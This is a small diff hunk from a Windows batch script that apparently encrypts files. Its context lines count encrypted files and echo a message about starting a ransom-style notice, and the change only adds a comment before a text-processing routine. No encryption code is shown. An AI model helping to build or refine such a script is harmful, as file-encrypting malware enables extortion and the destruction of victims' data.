@@ -46,7 +46,7 @@ if %cnt% NEQ 0 ( echo %cnt% files have been encrypted, starting message
 ) else (  echo no files have been encrypted, exiting )
 rem pause >nul
 
-
+rem shuffle thing
 :code
 set "INTEXTFILE=%1"
 set "OUTTEXTFILE=tmp.out"
